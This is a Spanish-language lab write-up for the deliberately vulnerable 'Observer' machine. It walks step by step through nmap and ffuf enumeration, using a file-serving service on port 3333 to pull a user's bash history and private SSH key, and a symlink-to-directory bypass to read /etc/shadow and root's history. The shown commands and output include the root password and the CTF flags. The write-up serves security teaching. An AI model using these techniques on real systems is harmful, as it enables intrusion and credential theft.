---
title: "🖥️ Máquina: Observer — Hacking Ético"
aliases:
  - Observer
  - observer
  - Máquina Observer
  - VM Observer
  - Writeup Observer
tags:
  - ifct0109
  - hacking-etico
  - vms
  - avanzadas
  - linux
  - ctf
---

# 🖥️ Máquina: Observer

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** Enumeración de servicios · Fuzzing de usuarios · Lectura de archivos remotos · Clave privada SSH · Ingeniería inversa (strings) · Escalada de privilegios (symlink + lectura de archivos de root)  
> **Descripción:** En esta práctica descubriremos una aplicación personalizada en el puerto 3333 que sirve archivos del sistema. Usaremos fuzzing para encontrar un usuario, leeremos su historial de comandos para obtener su clave SSH privada y accederemos al sistema. La escalada de privilegios aprovecha que la aplicación sigue enlaces simbólicos a directorios pero no a archivos directos, permitiéndonos leer el historial de root y obtener su contraseña.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.13`
* **`RHOST` (Víctima / Observer):** Ej. `10.0.0.30`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Observer tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.30
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
3333/tcp open  dec-notes
```

```bash
nmap -v -A -p 22,3333 10.0.0.30
```

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2 (protocol 2.0)
3333/tcp open  dec-notes?
|   GetRequest:
|     HTTP/1.0 200 OK
|     OBSERVING FILE: /home/ NOT EXIST
|     <!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
|   FourOhFourRequest:
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST
|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
```

> [!info] Resultado
> Dos puertos abiertos. El puerto 3333 responde a peticiones HTTP y muestra mensajes del tipo OBSERVING FILE: /home/ NOT EXIST. La aplicación parece servir archivos del sistema a partir de la ruta que se le pasa en la URL. Lo confirmamos con curl:

```bash
curl http://10.0.0.30:3333
```

```text
OBSERVING FILE: /home/ NOT EXIST
<!-- gmotaFetHsbZRjxAwnwekrBEmfdzdcHMV -->
```

```bash
curl http://10.0.0.30:3333/etc/passwd
```

> [!info] Resultado
> La aplicación intenta leer el archivo que le indicamos en la URL y devuelve su contenido si existe. La ruta base parece ser /home/ y lo que ponemos en la URL se añade después. El comentario HTML cambia en cada petición. Necesitamos encontrar un usuario válido del sistema para leer archivos de su directorio home.

---

## 👤 Fase 2: Fuzzing de usuarios

Usamos ffuf con un diccionario de nombres comunes para encontrar usuarios que tengan un .bashrc en su home. Filtramos con -fw 8 para ignorar las respuestas que tienen 8 palabras, que corresponden al mensaje de error cuando el archivo no existe:

```bash
ffuf -u 'http://10.0.0.30:3333/FUZZ/.bashrc' -w /usr/share/seclists/Usernames/Names/names.txt -fw 8
```

```text
jan  [Status: 200, Size: 3526, Words: 487, Lines: 114, Duration: 3ms]
```

> [!info] Resultado
> Usuario encontrado: jan. Su .bashrc tiene un tamaño considerable, lo que confirma que el directorio existe. Exploramos sus archivos:

```bash
curl 'http://10.0.0.30:3333/jan/.bashrc'
```

> [!info] Resultado
> Nada especialmente relevante en el bashrc. Revisamos el historial de comandos, que a menudo contiene información muy valiosa:

```bash
curl 'http://10.0.0.30:3333/jan/.bash_history'
```

> [!info] Resultado
> El historial revela dos datos importantes: referencias a una clave privada SSH y la flag de usuario. Leemos ambos:

```bash
curl 'http://10.0.0.30:3333/jan/user.txt'
```

```text
HMVdDepYxsi8VSucdruB3P7
```

> [!info] Resultado
> Flag de usuario obtenida: HMVdDepYxsi8VSucdruB3P7

---

## 🔑 Fase 3: Obtención de clave SSH privada

```bash
curl 'http://10.0.0.30:3333/jan/.ssh/id_rsa' > id_rsa
```

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa jan@10.0.0.30
```

```text
jan@observer:~$
```

> [!info] Resultado
> Acceso conseguido como jan sin necesidad de contraseña. Revisamos los privilegios sudo disponibles:

```bash
sudo -l
```

> [!info] Resultado
> Nos muestra una lista de tareas en la que podemos desplazarnos con las flechas. La parte más interesante es la del servicio cron, donde vemos que se ejecuta un archivo llamado observer:

```bash
sudo /usr/bin/systemctl -l status
```

```text
├─cron.service
│ ├─435 /usr/sbin/cron -f
│ ├─441 /usr/sbin/CRON -f
│ ├─445 /bin/sh -c /opt/observer
```

```bash
🔵 Alternativa — verificar con pspy64s:
    wget -c https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```

```bash
chmod +x pspy64s
```

```bash
./pspy64s
```

```text
2025/09/25 20:45:25 CMD: UID=0  PID=457  | /bin/sh -c /opt/observer
```

---

## 🔬 Fase 4: Análisis del binario observer

```bash
ls -l /opt/observer
```

```text
-rwxr-xr-x 1 root root 7376728 ago 21 2023 /opt/observer
```

> [!info] Resultado
> El binario pertenece a root y no podemos modificarlo. Lo descargamos a Kali para analizarlo. Salimos primero del SSH:

```bash
exit
```

```bash
scp -i id_rsa jan@10.0.0.30:/opt/observer ./
```

```bash
file observer
```

```text
observer: ELF 64-bit LSB executable, x86-64, dynamically linked
```

> [!info] Resultado
> Es un binario ELF compilado para Linux de 64 bits. Extraemos las cadenas de texto legibles que contiene:

```bash
strings observer | grep 3333
```

```text
/home1562578125:3333
```

> [!info] Resultado
> Confirmamos que el binario es la aplicación que está escuchando en el puerto 3333 y que sirve archivos desde /home. Para un análisis más profundo se puede usar ingeniería inversa en https://dogbolt.org/ o con Ghidra, aunque el archivo es grande y puede no caber en dogbolt.

---

## 🔗 Fase 5: Escalada de privilegios — symlink a directorio

Sabemos que la aplicación sirve archivos del sistema con privilegios de root. Dividimos el terminal horizontalmente. En la parte inferior nos conectamos de nuevo por SSH:

```bash
ssh -i id_rsa jan@10.0.0.30
```

Intentamos primero crear un enlace simbólico directamente a /etc/shadow:

```bash
ln -s /etc/shadow shadow
```

```bash
curl 'http://10.0.0.30:3333/jan/shadow'
```

```text
I DONT OBSERVE SYMLINKS LIKE: /home/jan/shadow
```

> [!info] Resultado
> La aplicación detecta y bloquea los enlaces simbólicos que apuntan directamente a archivos. Sin embargo, solo comprueba el último elemento de la ruta. Si creamos un enlace simbólico a un directorio y luego navegamos dentro de él, la aplicación no lo detecta como symlink porque el enlace es el directorio intermedio, no el archivo final.

Creamos un enlace simbólico al directorio /etc/ en lugar de al archivo:

```bash
ln -s /etc/ etc
```

```bash
curl 'http://10.0.0.30:3333/jan/etc/shadow'
```

> [!info] Resultado
> Ahora sí devuelve el contenido de /etc/shadow. El usuario root tiene un hash de contraseña, lo que confirma que su cuenta está activa. Exploramos el directorio home de root de la misma forma:

```bash
ln -s /root/ root
```

```bash
curl 'http://10.0.0.30:3333/jan/root/.ssh/id_rsa'
```

> [!info] Resultado
> La clave privada de root no existe. Revisamos su historial de comandos:

```bash
curl 'http://10.0.0.30:3333/jan/root/.bash_history'
```

```text
paswd
fuck1ng0bs3rv3rs
```

> [!info] Resultado
> El historial de root muestra un intento de cambio de contraseña con un error tipográfico (paswd en lugar de passwd) y lo que parece ser la contraseña en texto plano: fuck1ng0bs3rv3rs. Leemos también la flag de root:

```bash
curl 'http://10.0.0.30:3333/jan/root/root.txt'
```

```text
HMVb6MPDxdYLLC3sxNLIOH1
```

> [!info] Resultado
> Flag de root obtenida: HMVb6MPDxdYLLC3sxNLIOH1

Desde la shell de jan probamos la contraseña encontrada para convertirnos en root:

```bash
su
```

```text
Contraseña: fuck1ng0bs3rv3rs
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root
```

```bash
cat root.txt
```

```text
HMVb6MPDxdYLLC3sxNLIOH1
```

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
